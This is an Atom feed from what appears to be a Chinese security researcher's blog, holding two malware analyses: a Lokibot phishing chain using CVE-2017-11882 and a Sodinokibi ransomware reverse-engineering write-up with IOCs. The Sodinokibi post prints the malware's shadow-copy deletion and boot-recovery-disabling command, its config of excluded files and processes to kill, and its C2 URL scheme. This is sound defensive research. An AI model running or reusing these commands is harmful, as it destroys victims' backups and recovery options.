<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>偽のブログ</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.dgmddw.xyz/"/>
  <updated>2020-03-22T16:00:00.000Z</updated>
  <id>http://blog.dgmddw.xyz/</id>
  
  <author>
    <name>aWei</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>某黑产攻击分析与简单关联</title>
    <link href="http://blog.dgmddw.xyz/2020/03/23/2020-03-23%20-%20%E6%9F%90%E9%BB%91%E4%BA%A7%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E7%AE%80%E5%8D%95%E5%85%B3%E8%81%94/"/>
    <id>http://blog.dgmddw.xyz/2020/03/23/2020-03-23 - 某黑产攻击分析与简单关联/</id>
    <published>2020-03-22T16:00:00.000Z</published>
    <updated>2020-03-22T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0x01-样本信息"><a href="#0x01-样本信息" class="headerlink" title="0x01 样本信息"></a>0x01 样本信息</h1><table><thead><tr><th>样本名称</th><th>MT CONVOY  T. KARUNIA 2  V.2006N &amp; V.2006N1.docx</th></tr></thead><tbody><tr><td>样本大小</td><td>11,760 字节</td></tr><tr><td>MD5</td><td>ca69a722a82dcd5bd57ffe805c502f82</td></tr><tr><td>SHA-1</td><td>4ba9d6060409b091e1b817f433cdc0097bb219f1</td></tr><tr><td>木马家族</td><td>Lokibot</td></tr><tr><td>VT上传时间</td><td>2020-03-23 05:48:06 UTC</td></tr></tbody></table><p>样本地址: <a href="https://github.com/Xuwei98/malware-analysis-idb/tree/master/Trojan/Lokibot/2020-03-23" target="_blank" rel="noopener">link</a></p><a id="more"></a><h1 id="0x02-分析环境"><a href="#0x02-分析环境" class="headerlink" title="0x02 分析环境"></a>0x02 分析环境</h1><ul><li>win10 x64 pro</li><li>VMware Workstaion 15</li></ul><h1 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h1><h2 id="Word文件分析"><a href="#Word文件分析" class="headerlink" title="Word文件分析"></a>Word文件分析</h2><p>使用模板注入下载文件,设置文件位于<code>\word\_rels\webSetting.xml.rels</code></p><p><img src="https://i.loli.net/2020/03/23/mxdihEJKsDWTRyI.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/23/w7CykVE8FxqTrmp.png" alt="image.png"></p><h2 id="invoice-22115-doc"><a href="#invoice-22115-doc" class="headerlink" title="invoice_22115.doc"></a>invoice_22115.doc</h2><table><thead><tr><th>样本名称</th><th>invoice_22115.doc</th></tr></thead><tbody><tr><td>MD5</td><td>61b211906dfd28d5bbe6724e50c3bb20</td></tr><tr><td>SHA-1</td><td>84354e4cbfc989c37c46f848622175e54f31eccf</td></tr><tr><td>利用漏洞</td><td>CVE-2017-11882</td></tr></tbody></table><p>使用<code>GlobalLock</code>锁定全局内存.避免shellcode消失.</p><p><img src="https://i.loli.net/2020/03/23/TsIaLu24YGV5ftQ.png" alt="image.png"></p><p>异或解密shellcode后,通过Ldr获取所需Dll.</p><p>使用<code>URLDownloadToFileW</code>从源地址进行文件并保存为<code>%appdata%\\vbc.exe</code>.<img src="https://i.loli.net/2020/03/23/KRDfx8FhlMHwULY.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/23/3lSGrsUXafHkKZ7.png" alt="image.png"></p><p><code>ShellExecuteA</code>执行下载后的文件.</p><p><img src="https://i.loli.net/2020/03/23/TsIaLu24YGV5ftQ.png" alt="image.png"></p><h2 id="vbc-exe"><a href="#vbc-exe" class="headerlink" title="vbc.exe"></a>vbc.exe</h2><table><thead><tr><th>MD5</th><th>834300d014ae6e65201ce04d091219fc</th></tr></thead><tbody><tr><td>SHA-1</td><td>56af653938b12a12c4185ed71f221812c3fb4590</td></tr><tr><td>文件版本</td><td>1.7.9.1</td></tr><tr><td>原始文件名</td><td>Printstream Dropping.exe</td></tr><tr><td>家族</td><td>Lokibot</td></tr></tbody></table><p>该文件行为与常见的Lokibot木马存在一致性.</p><p>在%Appdata%中创建随机字符文件夹名和文件名,并拷贝.在RSA文件中创建文件收集基本信息.移除自身文件.</p><p><img src="https://i.loli.net/2020/03/23/fZ3CNk26LMsTVrA.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/24/DJOENkGwev2rR14.png" alt="image.png"></p><p>注册表使用目的域名作为键,键值为目的文件地址.<img src="https://i.loli.net/2020/03/24/vHf5q2hC8jiXnZz.png" alt="image.png"></p><p>在流量特征中也存在ckav.ru特征关键字.<img src="https://i.loli.net/2020/03/23/IXHOPTRU7g8zr4u.png" alt="image.png"></p><p>此样本使用网上现有的基于aPACK算法的压缩器<a href="http://www.ibsensoftware.com/download.html" target="_blank" rel="noopener">aPLib</a>嵌入软件自身作为保护.<img src="https://i.loli.net/2020/03/24/Y9DAXJqjrOz6L7V.png" alt="image.png"></p><p>解压缩后,样本为常见的Lokibot木马.</p><p><img src="https://i.loli.net/2020/03/24/xajW5itDeK3pFRG.png" alt="image.png"></p><h1 id="0x04-IOC"><a href="#0x04-IOC" class="headerlink" title="0x04 IOC"></a>0x04 IOC</h1><p>SHA-1</p><p>84354e4cbfc989c37c46f848622175e54f31eccf</p><p>4ba9d6060409b091e1b817f433cdc0097bb219f1</p><p>56af653938b12a12c4185ed71f221812c3fb4590</p><p>ip:</p><p>103.99.2.42</p><p>23.95.132.48</p><p>url:</p><p>http[:]//tescohomegroseryandelectronicstday2store.duckdns.org/chnsfrnd2/regasm.exe</p><p>http[:]//23.95.132.48/~main/.isuoxiso/w.php/2sN0gEZTW0LpL</p><h1 id="0x05-关联分析"><a href="#0x05-关联分析" class="headerlink" title="0x05 关联分析"></a>0x05 关联分析</h1><p>漏洞样本从apprun中获取,且该样本来来自于黑产相关的钓鱼垃圾邮件中.<img src="https://i.loli.net/2020/03/23/SXUmksOh4paez38.png" alt="image.png"></p><p>通过VT的关联存在相关链接地址.且<code>invoice</code>文件一直在实时更新名字,黑产活动频繁.<img src="https://i.loli.net/2020/03/24/EcxGb6lszKOkywT.png" alt="image.png"></p><p>此ip也对应三个域名地址.</p><p><img src="https://i.loli.net/2020/03/24/PHUj4hCG2vkJBrt.png" alt="image.png"></p><p>而访问此ip时,该文件夹下只具有一个doc文件,另一个文件夹也只存在一个Lokibot文件.时间都在最近.</p><p><img src="https://i.loli.net/2020/03/24/lZw9gLQRt67GBeK.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/24/FanlKJCR7VevP25.png" alt="image.png"></p><p>第二个ip也被微步标记为垃圾邮件</p><p><img src="https://i.loli.net/2020/03/24/13ebSLkpn2NMlij.png" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-样本信息&quot;&gt;&lt;a href=&quot;#0x01-样本信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 样本信息&quot;&gt;&lt;/a&gt;0x01 样本信息&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;样本名称&lt;/th&gt;
&lt;th&gt;MT CONVOY  T. KARUNIA 2  V.2006N &amp;amp; V.2006N1.docx&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;样本大小&lt;/td&gt;
&lt;td&gt;11,760 字节&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MD5&lt;/td&gt;
&lt;td&gt;ca69a722a82dcd5bd57ffe805c502f82&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SHA-1&lt;/td&gt;
&lt;td&gt;4ba9d6060409b091e1b817f433cdc0097bb219f1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;木马家族&lt;/td&gt;
&lt;td&gt;Lokibot&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;VT上传时间&lt;/td&gt;
&lt;td&gt;2020-03-23 05:48:06 UTC&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;样本地址: &lt;a href=&quot;https://github.com/Xuwei98/malware-analysis-idb/tree/master/Trojan/Lokibot/2020-03-23&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;link&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="样本分析" scheme="http://blog.dgmddw.xyz/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="VC" scheme="http://blog.dgmddw.xyz/tags/VC/"/>
    
      <category term="木马" scheme="http://blog.dgmddw.xyz/tags/%E6%9C%A8%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Sodinokibi勒索病毒分析</title>
    <link href="http://blog.dgmddw.xyz/2020/03/05/2020-03-05-Sodinokibi%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <id>http://blog.dgmddw.xyz/2020/03/05/2020-03-05-Sodinokibi勒索病毒分析/</id>
    <published>2020-03-04T16:00:00.000Z</published>
    <updated>2020-03-08T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0x01-样本信息"><a href="#0x01-样本信息" class="headerlink" title="0x01 样本信息"></a>0x01 样本信息</h1><ul><li><p>样本名称: 2</p></li><li><p>样本大小:  280,579 字节</p></li><li><p>MD5:  7d88dfcfe457bdc715371dbeaa4a5ef7</p></li><li><p>SHA-1: f2f36ef9976259a55123250ecc78fda3487f8848</p></li><li><p>SHA-256:  8bf7a344480c29b572fcead838c863093a5c88ba21d51085b6fc6ec3d8e8fbac</p></li><li><p>家族: Sodinokibi</p></li><li><p>idb与样本地址:  <a href="https://github.com/Xuwei98/malware-analysis/tree/master/Ransomware/2020-03-05-pe-Sodinokibi勒索病毒" target="_blank" rel="noopener">github</a></p><a id="more"></a></li></ul><h1 id="0x02-分析环境"><a href="#0x02-分析环境" class="headerlink" title="0x02 分析环境"></a>0x02 分析环境</h1><ul><li>win10 x64 pro</li><li>VMware Workstaion 15</li></ul><h1 id="0x03-行为分析"><a href="#0x03-行为分析" class="headerlink" title="0x03 行为分析"></a>0x03 行为分析</h1><h2 id="行为一览"><a href="#行为一览" class="headerlink" title="行为一览:"></a>行为一览:</h2><p><img src="https://i.loli.net/2020/03/05/PZtpMNK9LVFXQer.png" alt="image.png"></p><h2 id="进程树"><a href="#进程树" class="headerlink" title="进程树"></a>进程树</h2><p>从中可以看到启动<code>vssadmin.exe</code>删除卷影备份,<code>bcedit.exe</code>自动回复和开机启动禁用<code>Windows</code>开机启动错误恢复模式.</p><p><img src="https://i.loli.net/2020/03/02/4VwKz6eRGqxtEYi.png" alt="image.png"></p><p><code>&quot;C:\Windows\System32\cmd.exe&quot; /c vssadmin.exe Delete Shadows /All /Quiet &amp; bcdedit /set {default} recoveryenabled No &amp; bcdedit /set {default} bootstatuspolicy ignoreallfailures</code></p><h2 id="勒索信"><a href="#勒索信" class="headerlink" title="勒索信"></a>勒索信</h2><p>通过上传勒索信到<a href="https://id-ransomware.malwarehunterteam.com/" target="_blank" rel="noopener">ID Randomware</a>,识别出<code>Sodinokibi</code>勒索病毒.</p><p><img src="https://i.loli.net/2020/03/02/bYXG5qVEhtUHw64.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/02/eYGa9NSU5BQPcwK.png" alt="image.png"></p><p>每个文件夹下面都会释放一个<code>readme</code>文件.</p><p><img src="https://i.loli.net/2020/03/02/glFNaeArWM47opJ.png" alt="image.png"></p><h2 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h2><p>在注册表键<code>HKLM\\SOFTWARE\\WOWO6432Node\\recfg</code>注册键值.<code>0_key</code>,<code>pk_key</code>,<code>rnd_ext</code>,<code>sk_key</code>,<code>stat</code>.</p><p><img src="https://i.loli.net/2020/03/02/AwbJ8cgPxm4tTrC.png" alt="image.png"></p><p><code>rnd_ext</code>为加密文件后缀.</p><p><img src="https://i.loli.net/2020/03/02/rkLwYUCeAGtzRxg.png" alt="image.png"></p><h1 id="0x04-分析"><a href="#0x04-分析" class="headerlink" title="0x04 分析"></a>0x04 分析</h1><p>2020-03-09 后期补充:</p><ul><li><a href="#RC4解密">RC4解密</a></li><li><a href="#漏洞利用">CVE-2018- 8453</a></li><li><a href="#加密函数">加密函数</a></li><li><a href="#密钥创建函数">密钥创建函数</a></li></ul><p>使用<code>word</code>图标进行迷惑受害者.诱导执行.<code>win10与win7</code>启动时需要过UAC认证,算是一定程度上的阻止执行,但会无限弹窗UAC认证.</p><p><img src="https://i.loli.net/2020/03/02/SxdbOasgrC5LIN6.png" alt="image.png"></p><p>无壳,VC程序.</p><p>时间戳为<code>星期三, 24.10.2018 10:14:32 UTC</code></p><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><h3 id="壳"><a href="#壳" class="headerlink" title="壳"></a>壳</h3><p>释放加密数据到堆上</p><p><img src="https://i.loli.net/2020/03/02/wAUdXlue1WZbrJH.png" alt="image.png"></p><p>XXTEA解密数据.</p><p><img src="https://i.loli.net/2020/03/02/nOS2Uq3rlcXRLjA.png" alt="image.png"></p><p>更改权限,跳转到新程序处.</p><p><img src="https://i.loli.net/2020/03/02/SLp6EfZmX8chCBz.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/02/fTBUQ4bzxKVj1XR.png" alt="image.png"></p><h3 id="二次外壳"><a href="#二次外壳" class="headerlink" title="二次外壳"></a>二次外壳</h3><p>通过动态加载获得<code>VirtualAlloc</code>函数地址,并在<code>0x5430000</code>处申请空间.</p><p><img src="https://i.loli.net/2020/03/02/lhNAnBWwPvo9rsy.png" alt="image.png"></p><p>经过拷贝到目标地址后,dump下来单独分析.</p><p><img src="https://i.loli.net/2020/03/02/TlxSsK57UnAd8M3.png" alt="image.png"></p><p>后续执行情况为将此处程序拷贝修复后到<code>0x40000</code>,跳转执行.</p><p><img src="https://i.loli.net/2020/03/02/XBahcJtGqE4yrgK.png" alt="image.png"></p><h3 id="本体加密程序"><a href="#本体加密程序" class="headerlink" title="本体加密程序"></a>本体加密程序</h3><h3 id="pe特征"><a href="#pe特征" class="headerlink" title="pe特征"></a>pe特征</h3><table><thead><tr><th>时间戳</th><th>星期日, 19.05.2019 18:08:46 UTC</th></tr></thead><tbody><tr><td>MD5</td><td>0c2f9a02415c38d1cb1d5c558af971b8</td></tr><tr><td>SHA-1</td><td>6b53b24a4dd24db73e6ccf46e58f6d61a482047a</td></tr><tr><td>SHA-256</td><td>103e3743db5511f5f4aef4aaf02cdaf732531c9e8b894caa97de348e852bfa14</td></tr></tbody></table><p>存在资源表</p><p>据相关资料得知红框为密钥.</p><p><img src="https://i.loli.net/2020/03/05/CV65pFQWNoLbDuf.png" alt></p><h3 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h3><h4 id="加载函数"><a href="#加载函数" class="headerlink" title="加载函数"></a>加载函数</h4><p>动态解密字符串,从<code>dll</code>输出表寻找对应函数,获取函数地址.</p><p>并获取CreateStreamOnHGlobal地址.</p><p><img src="https://i.loli.net/2020/03/03/jYwd1eLmcUJ65xS.png" alt="image.png"></p><h4 id="创建互斥量"><a href="#创建互斥量" class="headerlink" title="创建互斥量"></a>创建互斥量</h4><p>通过字符串计算函数,得到互斥量名字,创建互斥量</p><p><img src="https://i.loli.net/2020/03/03/vPqCip8M3BHNnes.png" alt="image.png"></p><h4 id="释放资源表"><a href="#释放资源表" class="headerlink" title="释放资源表"></a>释放资源表</h4><p>对资源表进行<code>CRC32</code>资源表循环校验,后进行解密释放资源表到堆中</p><p><img src="https://i.loli.net/2020/03/03/Cc2elLiR1HDJst6.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/03/lte2VqnNIaEwxdZ.png" alt="image.png"></p><h4 id="RC4解密"><a href="#RC4解密" class="headerlink" title="RC4解密"></a><a name="RC4解密">RC4解密</a></h4><p><img src="https://i.loli.net/2020/03/09/yzZt9TdXksriOIj.png" alt="image.png"></p><p>解密数据一览json格式,<code>0x66cb</code>大小.全部字符串放在<code>资源表解密.txt</code>中了.从中看出公钥,被加密和被排除文件,背景图片,readme文件等信息.</p><p><img src="https://i.loli.net/2020/03/03/YrXl7MWxveaBApb.png" alt="image.png"></p><p>格式化后的样子:</p><p><img src="![image.png](https://i.loli.net/2020/03/09/xYbTDKkXBI5rEZL.png" alt="image.png"></p><ul><li><p>公钥:”pk”: “pzprC6xbhNFhM/+qJI6gCrd2pnCgyRdai+B89OUhWAw=”</p></li><li><p>dbg 模式</p></li><li><p>白名单过滤,目录,文件,后缀:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;fld&quot;: [&quot;tor browser&quot;, &quot;msocache&quot;, &quot;$windows.~ws&quot;, &quot;application data&quot;, &quot;windows&quot;, &quot;mozilla&quot;, &quot;program files&quot;, &quot;windows.old&quot;, &quot;$windows.~bt&quot;, &quot;perflogs&quot;, &quot;program files (x86)&quot;, &quot;programdata&quot;, &quot;system volume information&quot;, &quot;google&quot;, &quot;$recycle.bin&quot;, &quot;intel&quot;, &quot;boot&quot;, &quot;appdata&quot;],</span><br><span class="line">&quot;fls&quot;: [&quot;ntuser.dat.log&quot;, &quot;boot.ini&quot;, &quot;thumbs.db&quot;, &quot;autorun.inf&quot;, &quot;bootsect.bak&quot;, &quot;bootfont.bin&quot;, &quot;desktop.ini&quot;, &quot;iconcache.db&quot;, &quot;ntldr&quot;, &quot;ntuser.ini&quot;, &quot;ntuser.dat&quot;],</span><br><span class="line">&quot;ext&quot;: [&quot;cmd&quot;, &quot;hta&quot;, &quot;sys&quot;, &quot;cab&quot;, &quot;exe&quot;, &quot;diagcfg&quot;, &quot;shs&quot;, &quot;diagcab&quot;, &quot;scr&quot;, &quot;themepack&quot;, &quot;ps1&quot;, &quot;prf&quot;, &quot;nomedia&quot;, &quot;mpa&quot;, &quot;ldf&quot;, &quot;drv&quot;, &quot;msc&quot;, &quot;dll&quot;, &quot;msi&quot;, &quot;cur&quot;, &quot;icns&quot;, &quot;diagpkg&quot;, &quot;nls&quot;, &quot;theme&quot;, &quot;msstyles&quot;, &quot;lnk&quot;, &quot;386&quot;, &quot;deskthemepack&quot;, &quot;ico&quot;, &quot;cpl&quot;, &quot;idx&quot;, &quot;bat&quot;, &quot;mod&quot;, &quot;lock&quot;, &quot;msp&quot;, &quot;spl&quot;, &quot;com&quot;, &quot;rom&quot;, &quot;msu&quot;, &quot;bin&quot;, &quot;key&quot;, &quot;hlp&quot;, &quot;icl&quot;, &quot;rtp&quot;, &quot;ocx&quot;, &quot;wpx&quot;, &quot;ani&quot;, &quot;adv&quot;, &quot;ics&quot;]</span><br><span class="line">&quot;wfld&quot;: [&quot;backup&quot;],</span><br></pre></td></tr></table></figure></li><li><p>结束进程: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;prc&quot;: [&quot;xfssvccon.exe&quot;, &quot;msaccess.exe&quot;, &quot;dbsnmp.exe&quot;, &quot;sqbcoreservice.exe&quot;, &quot;synctime.exe&quot;, &quot;onenote.exe&quot;, &quot;dbeng50.exe&quot;, &quot;outlook.exe&quot;, &quot;msftesql.exe&quot;, &quot;excel.exe&quot;, &quot;agntsvc.exe&quot;, &quot;mysqld_opt.exe&quot;, &quot;ocautoupds.exe&quot;, &quot;thebat.exe&quot;, &quot;sqlbrowser.exe&quot;, &quot;wordpad.exe&quot;, &quot;powerpnt.exe&quot;, &quot;ocssd.exe&quot;, &quot;sqlservr.exe&quot;, &quot;winword.exe&quot;, &quot;mysqld.exe&quot;, &quot;thebat64.exe&quot;, &quot;encsvc.exe&quot;, &quot;steam.exe&quot;, &quot;firefoxconfig.exe&quot;, &quot;mydesktopqos.exe&quot;, &quot;mspub.exe&quot;, &quot;thunderbird.exe&quot;, &quot;visio.exe&quot;, &quot;oracle.exe&quot;, &quot;mydesktopservice.exe&quot;, &quot;mysqld_nt.exe&quot;, &quot;infopath.exe&quot;, &quot;isqlplussvc.exe&quot;, &quot;sqlagent.exe&quot;, &quot;ocomm.exe&quot;, &quot;sqlwriter.exe&quot;, &quot;tbirdconfig.exe&quot;]</span><br></pre></td></tr></table></figure></li><li><p>域名</p></li><li><p>网络状态</p></li><li><p>read-me文件内容编码</p></li><li><p>readme文件名”{EXT}-readme.txt”</p></li><li><p>exploit是否使用</p></li><li><p>图片编码:QQBsAGwAIABvAGYAIAB5AG8AdQByACAAZgBpAGwAZQBzACAAYQByAGUAIABlAG4AYwByAHkAcAB0AGUAZAAhAA0ACgANAAoARgBpAG4AZAAgAHsARQBYAFQAfQAtAHIAZQBhAGQAbQBlAC4AdAB4AHQAIABhAG4AZAAgAGYAbwBsAGwAbwB3ACAAaQBuAHMAdAB1AGMAdABpAG8AbgBzAAAA”</p></li></ul><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><a name="漏洞利用">漏洞利用</a></h4><p>如果exp为<code>True</code>,则执行<code>shellcode</code></p><p><img src="https://i.loli.net/2020/03/09/28n3N1TdkoAZJau.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/09/Zhz8kHM1GlCU4Sc.png" alt="image.png"></p><h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>通过PEB获取版本号,判断操作系统是否为Vista系统及以上.判断权限.</p><p>判断令牌类型,若不为管理员权限,则释放互斥体,使用<code>ShellExcuteEx</code>使用<code>runas</code>执行自身程序提升权限.因为是无限循环,所以导致拒绝后会一直弹窗申请权限.</p><p><img src="https://i.loli.net/2020/03/03/IgBGjZiMnk3pCH9.png" alt="image.png"></p><h4 id="高权限模拟登录"><a href="#高权限模拟登录" class="headerlink" title="高权限模拟登录"></a>高权限模拟登录</h4><p>判断是否为最高权限,使用 <code>ImpersonateLoggedOnUser()</code>函数模拟当前登录用户。<img src="https://i.loli.net/2020/03/03/vN8w1uWASxE9HC4.png" alt="image.png"></p><h4 id="获得所需信息"><a href="#获得所需信息" class="headerlink" title="获得所需信息"></a>获得所需信息</h4><p>格式化字符串如勒索告知等</p><p><img src="https://i.loli.net/2020/03/04/nHx6NBmUYd1CTIP.png" alt="image.png"></p><h5 id="注册表密钥"><a href="#注册表密钥" class="headerlink" title="注册表密钥"></a>注册表密钥</h5><p>注册表密钥放图注册表中<img src="https://i.loli.net/2020/03/04/HND1whOcCMunjLg.png" alt="image.png"></p><p>因为是32位程序,系统为64位,所以在<code>HKLC\\SOFTWARE\\WOW6432Node\\refg</code>中<img src="https://i.loli.net/2020/03/04/CvR8hd3LaBUAon1.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/04/jnCufmkNpAwhIGT.png" alt="image.png"></p><p><code>rnd_ext</code>和<code>stat</code>添加进注册表中<img src="https://i.loli.net/2020/03/04/XHM4mdzQNwBgbOU.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/04/mWfANnrV3iGgPS8.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/03/04/cbJ835ulgVNy29F.png" alt="image.png"></p><h5 id="获得键盘布局-判断国家"><a href="#获得键盘布局-判断国家" class="headerlink" title="获得键盘布局,判断国家"></a>获得键盘布局,判断国家</h5><p><img src="https://i.loli.net/2020/03/04/W6x1URQyV7aqBmo.png" alt="image.png"></p><p><code>add eax, 0FFFFFFE8h</code>后,看是否包含下列国家<img src="https://i.loli.net/2020/03/04/IsJUdDuKNa7VST3.png" alt="image.png"></p><h5 id="解密勒索信和背景文字"><a href="#解密勒索信和背景文字" class="headerlink" title="解密勒索信和背景文字"></a>解密勒索信和背景文字</h5><p>将与需要的信息格式化进解密后的勒索信.<img src="https://i.loli.net/2020/03/04/9ezgZrQ6qKIRC4Y.png" alt="image.png"></p><p>勒索背景文字.<img src="https://i.loli.net/2020/03/04/rV2gQHd89nAMxTN.png" alt="image.png"></p><h4 id="结束进程"><a href="#结束进程" class="headerlink" title="结束进程"></a>结束进程</h4><p><img src="https://i.loli.net/2020/03/04/paDC18x9F7htOjZ.png" alt="image.png"><img src="https://i.loli.net/2020/03/04/KJlIR4NwOTjDioy.png" alt="image.png"></p><h4 id="删除卷影备份等"><a href="#删除卷影备份等" class="headerlink" title="删除卷影备份等"></a>删除卷影备份等</h4><p><img src="https://i.loli.net/2020/03/04/QH5BMXTghws89AD.png" alt="image.png"></p><h4 id="IOCP多线程函数执行"><a href="#IOCP多线程函数执行" class="headerlink" title="IOCP多线程函数执行"></a>IOCP多线程函数执行</h4><p>使用IOCP相关函数加速加密执行</p><p><img src="https://i.loli.net/2020/03/04/RxSq5nGP3b4LNev.png" alt="image.png"></p><h5 id="磁盘遍历"><a href="#磁盘遍历" class="headerlink" title="磁盘遍历"></a>磁盘遍历</h5><p><img src="https://i.loli.net/2020/03/04/cpJdDaqSAbywokG.png" alt="image.png"></p><h5 id="文件创建函数"><a href="#文件创建函数" class="headerlink" title="文件创建函数"></a>文件创建函数</h5><p>在每个文件夹下创建lock文件和勒索信文件<img src="https://i.loli.net/2020/03/04/KBZqJFrbzksnuiC.png" alt="image.png"><img src="https://i.loli.net/2020/03/04/FQdRxWzfbXte3Y9.png" alt="image.png"></p><h5 id="密钥创建函数"><a href="#密钥创建函数" class="headerlink" title="密钥创建函数"></a><a name="密钥创建函数">密钥创建函数</a></h5><p>具体流程还是得看别人的分析报告,自己有点没弄清.</p><p><img src="https://i.loli.net/2020/03/10/2wkF18dIoJaPzBV.png" alt="image.png"></p><h5 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a><a name="加密函数">加密函数</a></h5><p>使用<code>GetQueueCompletionStatus</code>函数获取消息,进行文件操作如加密移动写入等.</p><p><img src="https://i.loli.net/2020/03/10/1nq8TCIyx3Wd4li.png" alt="image.png"></p><h4 id="网络共享资源加密"><a href="#网络共享资源加密" class="headerlink" title="网络共享资源加密"></a>网络共享资源加密</h4><p>用了模块“MPR.DLL”的典型 API 函数,枚举网络共享并调用加密函数.</p><p><img src="https://i.loli.net/2020/03/04/yM6S95vKTg4XHbz.png" alt="image.png"></p><h4 id="背景设置"><a href="#背景设置" class="headerlink" title="背景设置"></a>背景设置</h4><p>流程</p><p><img src="https://i.loli.net/2020/03/05/rmwA91yWl8dxeRE.png" alt="image.png"></p><p>文字参数</p><p><img src="https://i.loli.net/2020/03/05/dQiGSXIsWHJfuaA.png" alt="image.png"></p><p>壁纸参数</p><p><img src="https://i.loli.net/2020/03/05/ewmLiO6UxbqZ7fg.png" alt="image.png"></p><p>壁纸文件</p><p><img src="https://i.loli.net/2020/03/05/hdwkaDo3JSW91Ps.png" alt="image.png"></p><h4 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h4><p>使用For循环遍历<code>json</code>中<code>dmn</code>的值,</p><p><img src="https://i.loli.net/2020/03/05/xoftPKm5WBiJAdF.png" alt="image.png"></p><p>通过伪随机字符进行域名后缀和文件名的设定,包括以下字符</p><p>完整表示为<a href="https://broccolisoep.nl" target="_blank" rel="noopener">https://broccolisoep.nl</a> /static/image/jare.jpg</p><table><thead><tr><th>https://</th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>broccolisoep.nl</td><td>/</td><td>wp-content</td><td>/</td><td>images</td><td>/</td><td></td><td>.</td><td>jpg</td></tr><tr><td>boloria.de</td><td></td><td>static</td><td></td><td>pictures</td><td></td><td></td><td></td><td>png</td></tr><tr><td>bajova.sk</td><td></td><td>content</td><td></td><td>image</td><td></td><td></td><td></td><td>gif</td></tr><tr><td>……</td><td></td><td>include</td><td></td><td>temp</td><td></td><td>(a-z + a-z)</td><td></td><td></td></tr><tr><td></td><td></td><td>uploads</td><td></td><td>tmp</td><td></td><td>随机字符最多8组</td><td></td><td></td></tr><tr><td></td><td></td><td>news</td><td></td><td>graphic</td><td></td><td></td><td></td><td>16字节</td></tr><tr><td></td><td></td><td>data</td><td></td><td>assets</td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>admin</td><td></td><td>pics</td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>game</td><td></td><td></td><td></td></tr></tbody></table><p>会先判断是否能打开网址,再通过<code>WinHttpSendRequest</code>发送数据.</p><p><img src="https://i.loli.net/2020/03/05/KbqBX3lAMaWThe2.png" alt="image.png"></p><h1 id="0x05-IOC"><a href="#0x05-IOC" class="headerlink" title="0x05 IOC"></a>0x05 IOC</h1><p>hash:</p><p>7d88dfcfe457bdc715371dbeaa4a5ef7</p><p>0c2f9a02415c38d1cb1d5c558af971b8</p><h1 id="0x06总结"><a href="#0x06总结" class="headerlink" title="0x06总结"></a>0x06总结</h1><p>勒索病毒集成了勒索与xbxiuzji自己对算法相关识别还是不够敏感.无法看出salsa20的加密算法还需要多下功夫.</p><h1 id="0x07-reference"><a href="#0x07-reference" class="headerlink" title="0x07 reference"></a>0x07 reference</h1><p>XXTEA: <a href="https://www.shangmayuan.com/a/4c68db7440754c2c990d597d.html" target="_blank" rel="noopener">https://www.shangmayuan.com/a/4c68db7440754c2c990d597d.html</a></p><p>CRC32: <a 